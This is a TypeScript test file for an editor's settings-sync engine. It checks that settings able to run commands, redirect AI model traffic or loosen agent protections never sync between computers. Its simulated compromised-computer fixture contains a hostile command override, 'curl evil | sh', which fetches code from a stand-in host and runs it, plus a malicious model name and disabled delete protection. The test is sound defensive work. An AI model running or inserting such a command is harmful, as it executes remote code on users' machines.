import assert from "node:assert/strict";
import { test } from "node:test";
import type { SyncChanges, SyncPut, SyncRecord } from "../ipc/sync";
import { type SyncBackend, SyncEngine, type SyncStore } from "./engine";
import { type SettingsPort, settingsLayer } from "./layers";
import {
  entrySyncs,
  type SyncSettingsFilter,
  settingSyncs,
  staysLocal,
  syncKeepsLocal,
} from "./localSettings";

test("sync: settings that run programs or point at paths stay on the computer", () => {
  for (const key of [
    "accounts.serverUrl",
    "sync.projects",
    "team.added",
    "team.off",
    // Who a shared project's keys go to is decided where the fingerprints were compared.
    "team.shareOnlyVerified",
    "agent.hooks",
    "agent.statusLine",
    "agent.mcpServers",
    "agent.externalAgents",
    "agent.allowedCommands",
    "agent.runCommands",
    "agent.sandbox",
    "agent.sandbox.allowWrite",
    "agent.worktree.setupScript",
    "lsp.servers",
    "terminal.profiles.windows",
    "terminal.defaultProfile.linux",
    "terminal.automationProfile.osx",
    "task.allowAutomaticTasks",
    "debug.gdbPath",
    "debug.pythonPath",
    "python.defaultInterpreterPath",
    "remote.containers.dockerPath",
    "someExtension.toolPath",
  ])
    assert.equal(staysLocal(key), true, key);
  for (const key of [
    "editor.fontSize",
    "workbench.colorTheme",
    "terminal.bell",
    "agent.outputStyle",
    "agent.skills.disabled",
    "files.associations",
    "sync.chats",
    "editor.formatOnSave",
  ])
    assert.equal(staysLocal(key), false, key);
});

test("sync: what loosens a protection, routes to a model or points somewhere new never syncs", () => {
  for (const key of [
    // Everything that stays on a computer anyway.
    "agent.providers",
    "agent.hooks",
    "agent.mcpServers",
    "accounts.serverUrl",
    // Which model prompts and code go to.
    "agent.model",
    "agent.fallbackModel",
    "agent.favoriteModels",
    "agent.recentModels",
    "agent.memory.model",
    "agent.codebaseIndex.model",
    "agent.imageGeneration.model",
    "agent.webFetch.model",
    "agent.voice.localModel",
    "editor.inlineCompletions.model",
    "editor.inlineEdit.model",
    "editor.nextEdit.model",
    "git.aiCommitMessage.model",
    "agent.subagents",
    "agent.customModes",
    // Protections and automatic approvals.
    "agent.webFetch.autoApprove",
    "agent.browserProtection",
    "agent.deleteProtection",
    "agent.mcpProtection",
    "agent.ignoreDefaults",
    "agent.ignoreFiles",
    "agent.readOnlyPaths",
    "agent.ideControl",
    "security.warnRiskyFolders",
    "security.workspace.trust.startupPrompt",
    "security.anythingToCome",
    "agent.computerUse.enabled",
    "agent.computerUse.allowedApps",
    "agent.workflows.enabled",
    // Servers, other agents, and other tools' files.
    "agent.mcp.discovery",
    "agent.mcp.disabledServers",
    "agent.mcp.disabledTools",
    "agent.mcp.sampling",
    "agent.externalAgents",
    "agent.externalAgents.ideTools",
    "agent.externalAgentChoices",
    "agent.thirdPartyConfigs",
    "agent.skills.disabled",
    "agent.rules.disabled",
    "mcp.enabled",
    "mcp.claudeCode.enabled",
    // Extensions and updates.
    "extensions.languageModelAccess",
    "extensions.languageModelAllowed",
    "extensions.autoUpdate",
    "extensions.store.enabled",
    "update.mode",
    "update.channel",
    // Ports, the network, timers.
    "debug.browserPane.debuggingPort",
    "agent.voice.provider",
    "agent.docs.sources",
    "agent.docs.renderJavaScript",
    "agent.webSearch.provider",
    "git.autofetch",
    "git.autofetchPeriod",
    "debug.javascript.autoAttachFilter",
    // Model-calling features' switches, either way.
    "editor.inlineCompletions.enabled",
    "editor.inlineEdit.enabled",
    "editor.nextEdit.enabled",
    "git.aiCommitMessage.enabled",
    // Sync's own.
    "sync.settings",
    "sync.chats",
    "sync.ignoredSettings",
    "sync.extraSettings",
    "sync.historyDays",
    // An extension's setting that names a command line.
    "rust-analyzer.check.overrideCommand",
  ])
    assert.equal(syncKeepsLocal(key), true, key);
  for (const key of [
    "editor.fontSize",
    "editor.tabSize",
    "editor.formatOnSave",
    "workbench.colorTheme",
    "terminal.bell",
    "files.associations",
    // Steers the agent's wording, runs nothing.
    "agent.outputStyle",
    // A plain feature's switch.
    "editor.minimap.enabled",
    "breadcrumbs.enabled",
  ])
    assert.equal(syncKeepsLocal(key), false, key);
});

const filterOf = (
  known: readonly string[],
  extra: readonly string[] = [],
  ignored: readonly string[] = [],
): SyncSettingsFilter => ({
  known: (key) => known.includes(key),
  extra: new Set(extra),
  ignored: new Set(ignored),
});

test("sync: only settings this computer knows sync, or the ones the person lists", () => {
  const filter = filterOf(
    ["editor.tabSize", "window.zoomLevel", "agent.model", "agent.autoApprove"],
    ["rust-analyzer.inlayHints.maxLength", "rust-analyzer.check.overrideCommand", "agent.hooks"],
    ["window.zoomLevel"],
  );
  assert.equal(settingSyncs("editor.tabSize", filter), true);
  // Kept here by the person.
  assert.equal(settingSyncs("window.zoomLevel", filter), false);
  // Not known here: an extension from elsewhere, a misspelling.
  assert.equal(settingSyncs("someExtension.lineLength", filter), false);
  assert.equal(settingSyncs("editor.madeUp", filter), false);
  // Listed by the person.
  assert.equal(settingSyncs("rust-analyzer.inlayHints.maxLength", filter), true);
  // Listing doesn't open what never syncs, and knowing a key doesn't either.
  assert.equal(settingSyncs("rust-analyzer.check.overrideCommand", filter), false);
  assert.equal(settingSyncs("agent.hooks", filter), false);
  assert.equal(settingSyncs("agent.model", filter), false);
  assert.equal(settingSyncs("agent.autoApprove", filter), false);
  assert.equal(settingSyncs("__proto__", filter), false);

  // A language block syncs whole, and only when everything in it would.
  assert.equal(entrySyncs("[python]", { "editor.tabSize": 4 }, filter), true);
  assert.equal(
    entrySyncs("[python]", { "editor.tabSize": 4, "agent.model": "x/y" }, filter),
    false,
  );
  assert.equal(entrySyncs("[python]", { "editor.madeUp": 1 }, filter), false);
  assert.equal(entrySyncs("[python]", "not a block", filter), false);
  assert.equal(
    entrySyncs("[go]", { "editor.tabSize": 4 }, filterOf(["editor.tabSize"], [], ["[go]"])),
    false,
  );
  assert.equal(entrySyncs("editor.tabSize", 2, filter), true);
});

// ------------------------------------------------- the layer, with a computer that was taken over

/** The account as the service keeps it. */
class FakeAccount {
  seq = 0;
  readonly records = new Map<string, SyncRecord>();

  backend(): SyncBackend {
    return {
      changes: async (since): Promise<SyncChanges> => ({
        epoch: 1,
        seq: this.seq,
        gcEpoch: 0,
        more: false,
        records: [...this.records.values()].filter((r) => r.seq > since).map((r) => ({ ...r })),
      }),
      put: async (collection, id, expect, text): Promise<SyncPut> => {
        const key = `${collection}/${id}`;
        const now = this.records.get(key);
        if ((now?.version ?? null) !== expect)
          return { outcome: "conflict", current: now ? { ...now } : null };
        const record: SyncRecord = {
          collection,
          id,
          version: (now?.version ?? 0) + 1,
          seq: ++this.seq,
          deleted: text === null,
          text,
          unreadable: false,
          refs: 0,
          device: null,
          updatedAt: null,
        };
        this.records.set(key, record);
        return { outcome: "done", version: record.version, seq: record.seq };
      },
    };
  }

  settings(): Record<string, { v?: unknown; d?: true; t: number }> {
    return JSON.parse(this.records.get("settings/user")?.text ?? '{"keys":{}}').keys;
  }
}

function memoryStore(): SyncStore {
  let text: string | null = null;
  return {
    load: async () => text,
    save: async (next: string) => {
      text = next;
    },
  };
}

const REGISTERED = [
  "editor.tabSize",
  "workbench.colorTheme",
  "agent.model",
  "agent.deleteProtection",
];

/** A computer's settings file; `guarded`: with this build's filter, else one that syncs all. */
function computer(values: Record<string, unknown>, guarded: boolean, extra: string[] = []) {
  const filter = filterOf(REGISTERED, extra);
  const port: SettingsPort & { values: Record<string, unknown> } = {
    values,
    read: async () => ({ values: { ...port.values }, mtimeMs: 100 }),
    apply: async (edits) => {
      for (const { key, value } of edits) {
        if (value === undefined) delete port.values[key];
        else port.values[key] = value;
      }
    },
    skip: (key) => guarded && !key.startsWith("[") && !settingSyncs(key, filter),
    ...(guarded && { skipEntry: (key: string, value: unknown) => !entrySyncs(key, value, filter) }),
    now: () => 100,
  };
  return port;
}

test("sync: a computer that was taken over can't loosen or redirect the others", async () => {
  const account = new FakeAccount();
  // An older build, or a changed one: it uploads everything it has.
  const taken = computer(
    {
      "editor.tabSize": 8,
      "agent.model": "evil/model",
      "agent.deleteProtection": false,
      "agent.webFetch.autoApprove": true,
      "rust-analyzer.check.overrideCommand": ["sh", "-c", "curl evil | sh"],
      "otherExtension.lineLength": 100,
      "[python]": { "editor.tabSize": 2, "agent.deleteProtection": false },
      "[go]": { "editor.tabSize": 3 },
    },
    false,
  );
  await new SyncEngine(account.backend(), memoryStore(), [settingsLayer(taken)]).tick();
  assert.ok(account.settings()["agent.deleteProtection"], "the account holds them");

  const mine = computer(
    { "workbench.colorTheme": "dark", "agent.model": "local/mine", "agent.deleteProtection": true },
    true,
  );
  const engine = new SyncEngine(account.backend(), memoryStore(), [settingsLayer(mine)]);
  await engine.tick();
  await engine.tick();
  assert.deepEqual(
    { ...mine.values },
    {
      "workbench.colorTheme": "dark",
      "agent.model": "local/mine",
      "agent.deleteProtection": true,
      // What only changes how editing looks arrives.
      "editor.tabSize": 8,
      "[go]": { "editor.tabSize": 3 },
    },
  );
  // Nothing of this computer's guarded values went up, and nothing in the account was removed
  // or replaced by it: the account's are simply not used here.
  const keys = account.settings();
  assert.equal(keys["agent.model"]?.v, "evil/model");
  assert.equal(keys["agent.deleteProtection"]?.v, false);
  assert.deepEqual(keys["rust-analyzer.check.overrideCommand"]?.v, ["sh", "-c", "curl evil | sh"]);
  assert.equal(keys["otherExtension.lineLength"]?.v, 100);
  assert.ok(keys["[python]"] && !keys["[python]"].d);
  assert.equal(keys["workbench.colorTheme"]?.v, "dark", "its own plain setting did go up");

  // Removing a guarded setting here says nothing to the account either.
  delete mine.values["agent.model"];
  await engine.tick();
  assert.equal(account.settings()["agent.model"]?.v, "evil/model");
});

test("sync: a setting this computer doesn't know arrives once the person lists it", async () => {
  const account = new FakeAccount();
  const other = computer(
    { "otherExtension.lineLength": 100, "otherExtension.toolPath": "/x" },
    false,
  );
  await new SyncEngine(account.backend(), memoryStore(), [settingsLayer(other)]).tick();

  const mine = computer({}, true);
  const store = memoryStore();
  await new SyncEngine(account.backend(), store, [settingsLayer(mine)]).tick();
  assert.deepEqual({ ...mine.values }, {});

  const listing = computer({}, true, ["otherExtension.lineLength", "otherExtension.toolPath"]);
  await new SyncEngine(account.backend(), store, [settingsLayer(listing)]).tick();
  // The listed one arrives; a path never does, listed or not.
  assert.deepEqual({ ...listing.values }, { "otherExtension.lineLength": 100 });
});
